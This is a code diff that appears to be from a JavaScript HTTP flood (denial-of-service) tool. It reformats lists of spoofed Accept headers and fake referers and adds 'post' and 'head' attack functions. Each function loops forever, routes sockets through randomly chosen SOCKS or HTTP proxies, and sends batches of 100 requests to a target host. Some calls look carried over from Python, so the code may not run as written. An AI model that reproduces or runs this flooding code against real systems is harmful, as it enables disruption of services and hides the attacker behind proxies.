@@ -17,48 +17,48 @@ let data = "";
 let cookies = "";
 
 const acceptall = [
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-    "Accept-Encoding: gzip, deflate\r\n",
-    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
-    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-    "Accept: text/html, application/xhtml+xml",
-    "Accept-Language: en-US,en;q=0.5\r\n",
-    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+  "Accept-Encoding: gzip, deflate\r\n",
+  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+  "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
+  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+  "Accept: text/html, application/xhtml+xml",
+  "Accept-Language: en-US,en;q=0.5\r\n",
+  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+  "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
 ];
 
 const referers = [
-    "https://www.google.com/search?q=",
-    "https://check-host.net/",
-    "https://www.facebook.com/",
-    "https://www.youtube.com/",
-    "https://www.fbi.com/",
-    "https://www.bing.com/search?q=",
-    "https://r.search.yahoo.com/",
-    "https://www.cia.gov/index.html",
-    "https://vk.com/profile.php?redirect=",
-    "https://www.usatoday.com/search/results?q=",
-    "https://help.baidu.com/searchResult?keywords=",
-    "https://steamcommunity.com/market/search?q=",
-    "https://www.ted.com/search?q=",
-    "https://play.google.com/store/search?q=",
-    "https://www.qwant.com/search?q=",
-    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-    "https://www.google.ad/search?q=",
-    "https://www.google.ae/search?q=",
-    "https://www.google.com.af/search?q=",
-    "https://www.google.com.ag/search?q=",
-    "https://www.google.com.ai/search?q=",
-    "https://www.google.al/search?q=",
-    "https://www.google.am/search?q=",
-    "https://www.google.co.ao/search?q=",
+  "https://www.google.com/search?q=",
+  "https://check-host.net/",
+  "https://www.facebook.com/",
+  "https://www.youtube.com/",
+  "https://www.fbi.com/",
+  "https://www.bing.com/search?q=",
+  "https://r.search.yahoo.com/",
+  "https://www.cia.gov/index.html",
+  "https://vk.com/profile.php?redirect=",
+  "https://www.usatoday.com/search/results?q=",
+  "https://help.baidu.com/searchResult?keywords=",
+  "https://steamcommunity.com/market/search?q=",
+  "https://www.ted.com/search?q=",
+  "https://play.google.com/store/search?q=",
+  "https://www.qwant.com/search?q=",
+  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
+  "https://www.google.ad/search?q=",
+  "https://www.google.ae/search?q=",
+  "https://www.google.com.af/search?q=",
+  "https://www.google.com.ag/search?q=",
+  "https://www.google.com.ai/search?q=",
+  "https://www.google.al/search?q=",
+  "https://www.google.am/search?q=",
+  "https://www.google.co.ao/search?q=",
 ];
 
 function getuseragent() {
@@ -164,6 +164,63 @@ function cc(event, proxy_type) {
       for (let i = 0; i < 100; i++) {
         const get_host = `GET ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
         const request = get_host + header;
+        s.send(request);
+      }
+      s.close();
+    } catch (e) {
+      if (s) s.close();
+    }
+  }
+}
+
+function post(event, proxy_type) {
+  const header = GenReqHeader("post");
+  const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
+  event.wait();
+  while (true) {
+    let s = null;
+    try {
+      s = socks.socksocket();
+      if (proxy_type === 4) s.set_proxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
+      if (proxy_type === 5) s.set_proxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
+      if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
+      if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
+      s.connect(target, port);
+      if (protocol === "https") {
+        const ctx = ssl.createSecureContext();
+        s = ctx.wrap_socket(s, { serverHostname: target });
+      }
+      for (let i = 0; i < 100; i++) {
+        s.send(header);
+      }
+      s.close();
+    } catch (e) {
+      if (s) s.close();
+    }
+  }
+}
+
+function head(event, proxy_type) {
+  const header = GenReqHeader("head");
+  const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
+  const add = urlPath.includes("?") ? "&" : "?";
+  event.wait();
+  while (true) {
+    let s = null;
+    try {
+      s = socks.socksocket();
+      if (proxy_type === 4) s.set_proxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
+      if (proxy_type === 5) s.set_proxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
+      if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
+      if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
+      s.connect(target, port);
+      if (protocol === "https") {
+        const ctx = ssl.createSecureContext();
+        s = ctx.wrap_socket(s, { serverHostname: target });
+      }
+      for (let i = 0; i < 100; i++) {
+        const head_host = `HEAD ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
+        const request = head_host + header;
         s.send(request);
       }
       s.close();
